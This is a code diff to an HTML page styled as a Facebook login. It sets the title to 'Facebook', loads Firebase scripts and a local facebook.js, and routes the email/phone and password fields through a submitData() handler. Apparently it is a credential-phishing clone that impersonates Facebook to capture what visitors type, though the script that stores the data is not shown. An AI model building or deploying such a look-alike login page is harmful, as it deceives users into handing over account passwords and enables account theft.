@@ -3,10 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Facebook</title>
     <link rel="stylesheet" href="facebook.css">
 </head>
 <body>
+<script src="https://www.gstatic.com/firebasejs/8.9.1/firebase.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-analytics.js"></script>
+
+<script src="facebook.js"></script>
     <div class="textbox">
         <h1>
             facebook
@@ -19,23 +23,22 @@
 
     <div class="container">
 <div class="form">
-    <input type="text" class="text" placeholder="Enter Your Email or Phone number"> <br>
-    <input type="password" class="text" placeholder="Password"><br>
-    <button>
-        Log In
-    </button>
+    <form class="form" onSubmit="submitData() ;return false;">
+        <input type="text" class="text" placeholder="Enter Your Email or Phone number" id="username"> <br>
+        <input type="password" class="text" placeholder="Password" id="password"><br>
+        <button onClick = "submitData()">Log In</button>
+    </form>
+
+
     <p><a href="">forgot password?</a><br></p>
     <div class="btn">
         <button>Create New Account</button>
-     
-         
      </div>
-
-
-
 </div>
-
+</div> 
+<div>
+    <p class="noti_congrat" id="noti_congrat"></p>
     </div>
-    
+       
 </body>
 </html>
